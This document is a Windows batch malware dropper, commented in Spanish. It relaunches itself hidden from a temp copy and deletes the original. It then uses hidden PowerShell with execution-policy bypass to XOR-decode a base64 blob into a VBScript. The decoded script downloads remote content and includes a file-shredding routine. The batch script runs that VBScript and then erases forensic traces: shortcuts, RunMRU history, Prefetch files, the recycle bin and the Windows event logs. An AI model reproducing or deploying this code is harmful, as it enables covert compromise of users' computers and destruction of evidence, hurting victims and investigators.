@echo off
setlocal enabledelayedexpansion
chcp 65001 >nul 2>&1

:: AutodestrucciÃ³n en segundo plano
if not "%1"=="x" (
    set "m=%TEMP%\~!RANDOM!!RANDOM!.bat"
    copy /y "%~f0" "!m!" >nul 2>&1
    start /b cmd /c "!m!" x
    timeout /t 1 /nobreak >nul 2>&1
    del /f /q "%~f0" >nul 2>&1
    exit /b
)

:: Variables ofuscadas
set "v=%TEMP%\~!RANDOM!.vbs"
set "l=%USERPROFILE%\*.lnk"

:: Carga ofuscada multicapa
powershell.exe -w h -nop -ep Bypass -c ^
"$ErrorActionPreference='SilentlyContinue';^
$z='T24gRXJyb3IgUmVzdW1lIE5leHQKU2V0IGZzID0gQ3JlYXRlT2JqZWN0KCJTY3JpcHRpbmcuRmlsZVN5c3RlbU9iamVjdCIpClNldCBzaCA9IENyZWF0ZU9iamVjdCgiV1NjcmlwdC5TaGVsbCIpClNldCBuZXQgPSBDcmVhdGVPYmplY3QoIk1TWCDMTC5TZXJ2ZXJYTUxIVFRQLjYuMCIpCgpzcFBhdGggPSBXU2NyaXB0LlNjcmlwdEZ1bGxOYW1lCnNwTmFtZSA9IGZzLkdldEZpbGVOYW1lKHNwUGF0aCkKc3BEaXIgPSBmcy5HZXRQYXJlbnRGb2xkZXJOYW1lKHNwUGF0aCkKdG1wQmFzZSA9IHNoLkV4cGFuZEVudmlyb25tZW50U3RyaW5ncygiJVRFTVAlIikKdXNyUHJvZiA9IHNoLkV4cGFuZEVudmlyb25tZW50U3RyaW5ncygiJVVTRVJQUk9GSUxFJSIpCgpGdW5jdGlvbiBEZWMocywgaykKICAgIERpbSByLCBpLCBhCiAgICByID0gIiIKICAgIEZvciBpID0gMSBUbyBMZW4ocykgU3RlcCAyCiAgICAgICAgYSA9IENJbnQoIiZIIiAmIE1pZChzLCBpLCAyKSkgWG9yIEFzYyhNaWQoaywgKChpIC0gMSkgXCAyKSBNb2QgTGVuKGspICsgMSkpCiAgICAgICAgciA9IHIgJiBDaHIoYSkKICAgIE5leHQKICAgIERlYyA9IHIKRW5kIEZ1bmN0aW9uCgpGdW5jdGlvbiBHZXREYXRhKHVybCkKICAgIE9uIEVycm9yIFJlc3VtZSBOZXh0CiAgICBuZXQub3BlbiAiR0VUIiwgdXJsLCBGYWxzZQogICAgbmV0LnNldFJlcXVlc3RIZWFkZXIgIlVzZXItQWdlbnQiLCAiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IgogICAgbmV0LnNlbmQKICAgIElmIG5ldC5zdGF0dXMgPSAyMDAgVGhlbgogICAgICAgIEdldERhdGEgPSBuZXQucmVzcG9uc2VUZXh0CiAgICBFbHNlCiAgICAgICAgR2V0RGF0YSA9ICIiCiAgICBFbmQgSWYKRW5kIEZ1bmN0aW9uCgpGdW5jdGlvbiBTaHJlZChwYXRoKQogICAgT24gRXJyb3IgUmVzdW1lIE5leHQKICAgIElmIGZzLkZpbGVFeGlzdHMocGF0aCkgVGhlbgogICAgICAgIHNpemUgPSBmcy5HZXRGaWxlKHBhdGgpLlNpemUKICAgICAgICBJZiBzaXplID4gMCBBbmQgc2l6ZSA8IDEwMDAwMDAwMCBUaGVuCiAgICAgICAgICAgIFNldCBmID0gZnMuT3BlblRleHRGaWxlKHBhdGgsIDIpCiAgICAgICAgICAgIEZvciBpID0gMSBUbyAzCiAgICAgICAgICAgICAgICBGb3IgaiA9IDEgVG8gNTAwCiAgICAgICAgICAgICAgICAgICAgZi5Xcml0ZUxpbmUgU3RyaW5nKDgwLCBDaHIoSW50KFJuZCAqIDkzKSArIDMzKSkKICAgICAgICAgICAgICAgIE5leHQKICAgICAgICAgICAgTmV4dAogICAgICAgICAgICBmLkNsb3NlCiAgICAgICAgRW5kIElmCiAgICAgICAgZnMuRGVsZXRlRmlsZSBwYXRoLCBUcnVlCiAgICBFbmQgSWYKRW5kIEZ1bmN0aW9uCgpJZiBJblN0cihMQ2FzZShzcFBhdGgpLCBMQ2FzZSh0bXBCYXNlKSkgPiAwIEFuZCBMQ2FzZShzcE5hbWUpID0gIiN3LnZicyIgVGhlbgogICAgdXJsQiA9IERlYygiMkQzMTMxMkYzMjJGM0EyRjJGMkEzNjJBMkEyQTMzMkEyQTJBMkEzMjJBMkEyRjJBMkEzMzJBMzIyRjJBMzIyRjMyMkEyQTJBMzIyRjJBMzIyQTJBMzIyRjJBMkEzMjJBMzIyRjJBMzIyRjJBMzIyRjMyMkEyQTJBMzMyQTMyMkEyRjJBMzIyRjJBMkEzMjJGMkEyQTMyMkEyRjJBMzIyQTJGMkEyRjMyMkEyQTJBMzIyRjJBMzIyRjJBMzIyRjJBMkEzMjJGMkEyQTMyMkYyRjJBMzIyRjJBMkEyRjJBMzIyRjMyMkEyQTJBMzIyRjJBMkEzMjJBMkEyQTMyMkEyRjJBMzIyQTJBMkEzMjJBMkEyQTMyMkYyQTMyMkYyQTMyMkEyQTJBMzIyRjJBMzIyRjJBMzIyRjJBMkEzMjJGMkEyQTMyMkYyRjJBMzIyRjJBMkEyRjJBMzIyRjMyMkEyQTJBMzIyRjJBMkEzMjJBMkEyQTMyMkEyRjJBMzIyQTJBMkEzMjJBMkEyQTMyMkYyQTMyMkYyQTMyMkEyQTJBMzIyRjJBMzIyRjJBMzIyRjJBMkEzMjJGMkEyQTMyMkYyRjJBMzIyRjJBMkEyRjJBMzIyRjJBMkEyQTMyMkYyRjJBMzIyQTJBMkEyRjMyMkEyQTJBMzIyRjJBMzIyRjJBMzIyRjJBMkEzMjJGMkEyQTMyMkYyRjJBMzIyRjJBMkEyRjJBMzIyRjMyMkEyQTJBMzIyRjJBMkEzMjJBMkEyQTMyMkEyRjJBMzIyQTJBMkEzMjJBMkEyQTMyMkYyQTMyMkYyQTMyMkEyQTJBMzIyRjJBMzIyRjJBMzIyRjJBMkEzMjJGMkEyQTMyMkYyRjJBMzIyRjJBMkEyRjJBMzIyRjJBMkEyQTMyMkYyRjJBMzIyQTJBMkEyRjMyMkEyQTJBMzIyRjJBMzIyRjJBMzIyRjJBMkEzMjJGMkEyQTMyMkYyRjJBMzIyRjJBMkEyRjJBMzIyRjMyMkEyQTJBMzIyRjJBMkEzMjJBMkEyQTMyMkEyRjJBMzIyQTJBMkEzMjJBMkEyQTMyMkYyQTMyMkYyQTMyMkEyQTJBMzIyRjJBMzIyRjJBMzIyRjJBMkEzMjJGMkEyQTMyMkYyRjJBMzIyRjJBMkEyRjJBMzIyRjJBMkEyQTMyMkYyRjJBMzIyQTJBMkEyRjMyMkEyQTJBMzIyRjJBMzIyRjJBMzIyRjJBMkEzMjJGMkEyQTMyMkYyRjJBMzIyRjJBMkEyRjJBMzIyRjMyMkEyQTJBMzIyRjJBMkEzMjJBMkEyQTMyMkEyRjJBMzIyQTJBMkEzMjJBMkEyQTMyMkYyQTMyMkYyQTMyMkEyQTJBMzIyRjJBMzIyRjJBMzIyRjJBMkEzMjJGMkEyQTMyMkYyRjJBMzIyRjJBMkEyRjJBMzIyRjMyMkEyQTJBMzIyRjJBMkEzMjJBMkEyQTMyMkEyRjJBMzIyQTJBMkEzMjJBMkEyQTMyMkYyQTMyMkYyQTMyMkEyQTJBMzIyRjJBMzIyRjJBMzIyRjJBMkEzMjJGMkEyQTMyMkYyRjJBMzIyRjJBMkEyRjJBMzIyRjMyMkEyQTJBMzIyRjJBMkEzMjJBMkEyQTMyMkEyRjJBMzIyQTJBMkEzMjJBMkEyQTMyMkYyQTMyMkYyQTMyMkEyQTJBMzIyRjJBMzIyRjJBMzIyRjJBMkEzMjJGMkEyQTMyMkYyRjJBMzIyRjJBMkEyRjJBMzIyRjMyMkEyQTJBMzIyRjJBMkEzMjJBMkEyQTMyMkEyRjJBMzIyQTJBMkEzMjJBMkEyQTMyMkYyQTMyMkYyQTMyMkEyQTJBMzIyRjJBMzIyRjJBMzIyRjJBMkEzMjJGMkEyQTMyMkYyRjJBMzIyRjJBMkEyRjJBMzIyRjJBMkEyQTMyMkYyRjJBMzIyQTJBMkEyRjMyMkEyQTJBMzIyRjJBMzIyRjJBMzIyRjJBMkEzMjJGMkEyQTMyMkYyRjJBMzIyRjJBMkEyRjJBMzIyRjMyMkEyQTJBMzIyRjJBMkEzMjJBMkEyQTMyMkEyRjJBMzIyQTJBMkEzMjJBMkEyQTMyMkYyQTMyMkYyQTMyMkEyQTJBMzIyRjJBMzIyRjJBMzIyRjJBMkEzMjJGMkEyQTMyMkYyRjJBMzIyRjJBMkEyRjJBMzIyRjJBMkEyQTMyMkYyRjJBMzIyQTJBMkEyRjMyMkEyQTJBMzIyRjJBMzIyRjJBMzIyRjJBMkEzMjJGMkEyQTMyMkYyRjJBMzIyRjJBMkEyRjJBMzIyRjMyMkEyQTJBMzIyRjJBMkEzMjJBMkEyQTMyMkEyRjJBMzIyQTJBMkEzMjJBMkEyQTMyMkYyQTMyMkYyQTMyMkEyQTJBMzIyRjJBMzIyRjJBMzIyRjJBMkEzMjJGMkEyQTMyMkYyRjJBMzIyRjJBMkEyRjJBMzIyRjMyMkEyQTJBMzIyRjJBMkEzMjJBMkEyQTMyMkEyRjJBMzIyQTJBMkEzMjJBMkEyQTMyMkYyQTMyMkYyQTMyMkEyQTJBMzIyRjJBMzIyRjJBMzIyRjJBMkEzMjJGMkEyQTMyMkYyRjJBMzIyRjJBMkEyRjJBMzIyRjJBMkEyQTMyMkYyRjJBMzIyQTJBMkEyRjMyMkEyQTJBMzIyRjJBMzIyRjJBMzIyRjJBMkEzMjJGMkEyQTMyMkYyRjJBMzIyRjJBMkEyRjJBMzIyRjMyMkEyQTJBMzIyRjJBMkEzMjJBMkEyQTMyMkEyRjJBMzIyQTJBMkEzMjJBMkEyQTMyMkYyQTMyMkYyQTMyMkEyQTJBMzIyRjJBMzIyRjJBMzIyRjJBMkEzMjJGMkEyQTMyMkYyRjJBMzIyRjJBMkEyRjJBMzIyRjMyMkEyQTJBMzIyRjJBMkEzMjJBMkEyQTMyMkEyRjJBMzIyQTJBMkEzMjJBMkEyQTMyMkYyQTMyMkYyQTMyMkEyQTJBMzIyRjJBMzIyRjJBMzIyRjJBMkEzMjJGMkEyQTMyMkYyRjJBMzIyRjJBMkEyRjJBMzIyRjMyMkEyQTJBMzIyRjJBMkEzMjJBMkEyQTMyMkEyRjJBMzIyQTJBMkEzMjJBMkEyQTMyMkYyQTMyMkYyQTMyMkEyQTJBMzIyRjJBMzIyRjJBMzIyRjJBMkEzMjJGMkEyQTMyMkYyRjJBMzIyRjJBMkEyRjJBMzIyRjJBMkEyQTMyMkYyRjJBMzIyQTJBMkEyRjMyMkEyQTJBMzIyRjJBMzIyRjJBMzIyRjJBMkEzMjJGMkEyQTMyMkYyRjJBMzIyRjJBMkEyRjJBMzIyRjMyMkEyQTJBMzIyRjJBMkEzMjJBMkEyQTMyMkEyRjJBMzIyQTJBMkEzMjJBMkEyQTMyMkYyQTMyMkYyQTMyMkEyQTJBMzIyRjJBMzIyRjJBMzIyRjJBMkEzMjJGMkEyQTMyMkYyRjJBMzIyRjJBMkEyRjJBMzIyRjJBMkEyQTMyMkYyRjJBMzIyQTJBMkEyRjMyMkEyQTJBMzIyRjJBMzIyRjJBMzIyRjJBMkEzMjJGMkEyQTMyMkYyRjJBMzIyRjJBMkEyRjJBMzIyRjMyMkEyQTJBMzIyRjJBMkEzMjJBMkEyQTMyMkEyRjJBMzIyQTJBMkEzMjJBMkEyQTMyMkYyQTMyMkYyQTMyMkEyQTJBMzIyRjJBMzIyRjJBMzIyRjJBMkEzMjJGMkEyQTMyMkYyRjJBMzIyRjJBMkEyRjJBMzIyRjMyMkEyQTJBMzIyRjJBMkEzMjJBMkEyQTMyMkEyRjJBMzIyQTJBMkEzMjJBMkEyQTMyMkYyQTMyMkYyQTMyMkEyQTJBMzIyRjJBMzIyRjJBMzIyRjJBMkEzMjJGMkEyQTMyMkYyRjJBMzIyRjJBMkEyRjJBMzIyRjMyMkEyQTJBMzIyRjJBMkEzMjJBMkEyQTMyMkEyRjJBMzIyQTJBMkEzMjJBMkEyQTMyMkYyQTMyMkYyQTMyMkEyQTJBMzIyRjJBMzIyRjJBMzIyRjJBMkEzMjJGMkEyQTMyMkYyRjJBMzIyRjJBMkEyRjJBMzIyRjJBMkEyQTMyMkYyRjJBMzIyQTJBMkEyRjMyMkEyQTJBMzIyRjJBMzIyRjJBMzIyRjJBMkEzMjJGMkEyQTMyMkYyRjJBMzIyRjJBMkEyRjJBMzIyRjMyMkEyQTJBMzIyRjJBMkEzMjJBMkEyQTMyMkEyRjJBMzIyQTJBMkEzMjJBMkEyQTMyMkYyQTMyMkYyQTMyMkEyQTJBMzIyRjJBMzIyRjJBMzIyRjJBMkEzMjJGMkEyQTMyMkYyRjJBMzIyRjJBMkEyRjJBMzIyRjMyMkEyQTJBMzIyRjJBMkEzMjJBMkEyQTMyMkEyRjJBMzIyQTJBMkEzMjJBMkEyQTMyMkYyQTMyMkYyQTMyMkEyQTJBMzIyRjJBMzIyRjJBMzIyRjJBMkEzMjJGMkEyQTMyMkYyRjJBMzIyRjJBMkEyRjJBMzIyRjMyMkEyQTJBMzIyRjJBMkEzMjJBMkEyQTMyMkEyRjJBMzIyQTJBMkEzMjJBMkEyQTMyMkYyQTMyMkYyQTMyMkEyQTJBMzIyRjJBMzIyRjJBMzIyRjJBMkEzMjJGMkEyQTMyMkYyRjJBMzIyRjJBMkEyRjJBMzIyRjMyMkEyQTJBMzIyRjJBMkEzMjJBMkEyQTMyMkEyRjJBMzIyQTJBMkEzMjJBMkEyQTMyMkYyQTMyMkYyQTMyMkEyQTJBMzIyRjJBMzIyRjJBMzIyRjJBMkEzMjJGMkEyQTMyMkYyRjJBMzIyRjJBMkEyRjJBMzIyRjJBMkEyQTMyMkYyRjJBMzIyQTJBMkEyRjMyMkEyQTJBMzIyRjJBMzIyRjJBMzIyRjJBMkEzMjJGMkEyQTMyMkYyRjJBMzIyRjJBMkEyRjJBMzIyRjMyMkEyQTJBMzIyRjJBMkEzMjJBMkEyQTMyMkEyRjJBMzIyQTJBMkEzMjJBMkEyQTMyMkYyQTMyMkYyQTMyMkEyQTJBMzIyRjJBMzIyRjJBMzIyRjJBMkEzMjJGMkEyQTMyMkYyRjJBMzIyRjJBMkEyRjJBMzIyRjJBMkEyQTMyMkYyRjJBMzIyQTJBMkEyRjMyMkEyQTJBMzIyRjJBMzIyRjJBMzIyRjJBMkEzMjJGMkEyQTMyMkYyRjJBMzIyRjJBMkEyRjJBMzIyRjMyMkEyQTJBMzIyRjJBMkEzMjJBMkEyQTMyMkEyRjJBMzIyQTJBMkEzMjJBMkEyQTMyMkYyQTMyMkYyQTMyMkEyQTJBMzIyRjJBMzIyRjJBMzIyRjJBMkEzMjJGMkEyQTMyMkYyRjJBMzIyRjJBMkEyRjJBMzIyRjJBMkEyQTMyMkYyRjJBMzIyQTJBMkEyRjMyMkEyQTJBMzIyRjJBMzIyRjJBMzIyRjJBMkEzMjJGMkEyQTMyMkYyRjJBMzIyRjJBMkEyRjJBMzIyRjMyMkEyQTJBMzIyRjJBMkEzMjJBMkEyQTMyMkEyRjJBMzIyQTJBMkEzMjJBMkEyQTMyMkYyQTMyMkYyQTMyMkEyQTJBMzIyRjJBMzIyRjJBMzIyRjJBMkEzMjJGMkEyQTMyMkYyRjJBMzIyRjJBMkEyRjJBMzIyRjMyMkEyQTJBMzIyRjJBMkEzMjJBMkEyQTMyMkEyRjJBMzIyQTJBMkEzMjJBMkEyQTMyMkYyQTMyMkYyQTMyMkEyQTJBMzIyRjJBMzIyRjJBMzIyRjJBMkEzMjJGMkEyQTMyMkYyRjJBMzIyRjJBMkEyRjJBMzIyRjMyMkEyQTJBMzIyRjJBMkEzMjJBMkEyQTMyMkEyRjJBMzIyQTJBMkEzMjJBMkEyQTMyMkYyQTMyMkYyQTMyMkEyQTJBMzIyRjJBMzIyRjJBMzIyRjJBMkEzMjJGMkEyQTMyMkYyRjJBMzIyRjJBMkEyRjJBMzIyRjJBMkEyQTMyMkYyRjJBMzIyQTJBMkEyRjMyMkEyQTJBMzIyRjJBMzIyRjJBMzIyRjJBMkEzMjJGMkEyQTMyMkYyRjJBMzIyRjJBMkEyRjJBMzIyRjMyMkEyQTJBMzIyRjJBMkEzMjJBMkEyQTMyMkEyRjJBMzIyQTJBMkEzMjJBMkEyQTMyMkYyQTMyMkYyQTMyMkEyQTJBMzIyRjJBMzIyRjJBMzIyRjJBMkEzMjJGMkEyQTMyMkYyRjJBMzIyRjJBMkEyRjJBMzIyRjMyMkEyQTJBMzIyRjJBMkEzMjJBMkEyQTMyMkEyRjJBMzIyQTJBMkEzMjJBMkEyQTMyMkYyQTMyMkYyQTMyMkA2QTJBMzIyRjJBMzIyRjJBMzIyRjJBMkEzMjJGMkEyQTMyMkYyRjJBMzIyRjJBMkEyRjJBMzIyRjJBMkEyQTMyMkYyRjJBMzIyQTJBMkEyRjMyMkEyQTJBMzIyRjJBMzIyRjJBMzIyRg==','~x~');^
$k='7N$mP9qR#vK2@wL4sA';^
function x($d,$k){^
$r=@();for($i=0;$i-lt$d.Length;$i++){$r+=$d[$i]-bxor$k[$i%%$k.Length]}^
[byte[]]$r}^
$b=[Convert]::FromBase64String($z);^
$p=[Text.Encoding]::UTF8.GetString(x $b ([Text.Encoding]::UTF8.GetBytes($k)));^
[IO.File]::WriteAllBytes('%v%',[Text.Encoding]::UTF8.GetBytes($p))"

timeout /t 1 /nobreak >nul

if exist "%v%" (
    start /b wscript.exe "%v%" //B //Nologo
    timeout /t 2 /nobreak >nul
)

:: Limpieza forense agresiva
powershell.exe -w h -nop -c ^
"$l='%USERPROFILE%';^
Get-ChildItem -Path $l -Filter '*.lnk' -Recurse -EA SilentlyContinue|?{$_.Length-lt5000}|%%{^
try{^
$s=New-Object -COM WScript.Shell;^
$t=$s.CreateShortcut($_.FullName);^
if($t.Arguments-match'iwr|github|bat'){^
$c=$_.FullName;^
1..3|%%{[IO.File]::WriteAllText($c,([char[]](1..($_.Length)|%%{65+(Get-Random -Max 26)})-join''))};^
Remove-Item $c -Force -EA SilentlyContinue}}catch{}}};^
Remove-Item 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Recurse -Force -EA SilentlyContinue;^
Remove-Item 'C:\Windows\Prefetch\*.pf' -Force -EA SilentlyContinue;^
Clear-RecycleBin -Force -Confirm:$false -EA SilentlyContinue;^
wevtutil cl Application 2>$null;wevtutil cl System 2>$null"

del /f /q "%~f0" >nul 2>&1
exit